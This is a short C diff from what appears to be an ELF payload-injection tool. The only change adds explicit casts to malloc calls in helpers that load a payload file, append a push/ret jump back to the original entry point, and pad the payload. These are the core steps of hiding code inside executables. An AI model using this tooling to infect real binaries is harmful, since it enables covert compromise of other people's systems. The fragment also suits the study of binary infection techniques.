@@ -15,7 +15,7 @@ unsigned char *get_payload(char *pl_fname, Elf64_Half *pl_size) {
 	fseek(pl_file, 0L, SEEK_END);
 	*pl_size = ftell(pl_file);
 	fseek(pl_file, 0L, SEEK_SET);
-	pl = malloc(*pl_size * sizeof(unsigned char));
+	pl = (unsigned char*) malloc(*pl_size * sizeof(unsigned char));
 	fread(pl, sizeof(unsigned char), *pl_size, pl_file);
 	fclose(pl_file);
 	return pl;
@@ -23,7 +23,7 @@ unsigned char *get_payload(char *pl_fname, Elf64_Half *pl_size) {
 	
 
 unsigned char *Elf64le_jmp_entry_pl(Elf64_Addr ep) {
-	unsigned char *pl = malloc(JMP_ENTRY_PL_SIZE * sizeof(char)); 
+	unsigned char *pl = (unsigned char*) malloc(JMP_ENTRY_PL_SIZE * sizeof(char)); 
 	pl[0] = 0x68;
 	pl[1] = (unsigned char) (ep & 0xFF);
 	pl[2] = (unsigned char) ((ep >> 8) & 0xFF);
@@ -36,7 +36,7 @@ unsigned char *Elf64le_jmp_entry_pl(Elf64_Addr ep) {
 
 unsigned char *Elf64le_add_jmp_entry_pl(unsigned char *pl, Elf64_Addr ep, Elf64_Half *pl_size) {
 	std_out("[*] Add jump to initial entry point at the end of payload\n");
-	unsigned char *payload = malloc((*pl_size + JMP_ENTRY_PL_SIZE) * sizeof(char));
+	unsigned char *payload = (unsigned char*) malloc((*pl_size + JMP_ENTRY_PL_SIZE) * sizeof(char));
 	unsigned char *jmp_entry_pl = Elf64le_jmp_entry_pl(ep); 
 	Elf64_Half i;
 	for (i = 0; i < *pl_size; i++) 
@@ -51,7 +51,7 @@ unsigned char *Elf64le_add_jmp_entry_pl(unsigned char *pl, Elf64_Addr ep, Elf64_
 
 
 unsigned char *pad_payload(unsigned char *pl, Elf64_Half *pl_size, Elf64_Half target_size, unsigned char pad) {
-	unsigned char *payload = malloc(target_size * sizeof(unsigned char));
+	unsigned char *payload = (unsigned char*) malloc(target_size * sizeof(unsigned char));
 	size_t i;
 	for (i = 0; i < *pl_size; i++)
 		payload[i] = pl[i];
